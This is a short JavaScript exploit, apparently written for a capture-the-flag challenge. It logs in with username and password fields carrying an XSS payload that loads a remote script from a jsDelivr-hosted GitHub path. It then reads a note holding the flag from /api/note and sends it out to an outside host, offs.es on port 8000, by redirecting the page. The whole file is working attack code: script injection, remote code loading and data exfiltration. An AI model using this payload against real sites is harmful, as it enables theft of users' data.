(async () => {
  await fetch('/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body:
      'username='+encodeURIComponent('"</script><script src=https://cdn.jsdelivr.net/gh/PabloMarrtinez/ctf/poc.js></script><!--')+
      '&password='+encodeURIComponent('"</script><script src=https://cdn.jsdelivr.net/gh/PabloMarrtinez/ctf/poc.js></script><!--')
  });

  /* 2️⃣  Lee la nota ( FLAG ) */
  const r  = await fetch('/api/note');
  const j  = await r.json();

  /* 3️⃣  Exfiltra por HTTP plano */
  location = 'http://offs.es:8000/?f=' + encodeURIComponent(j.note);
})();

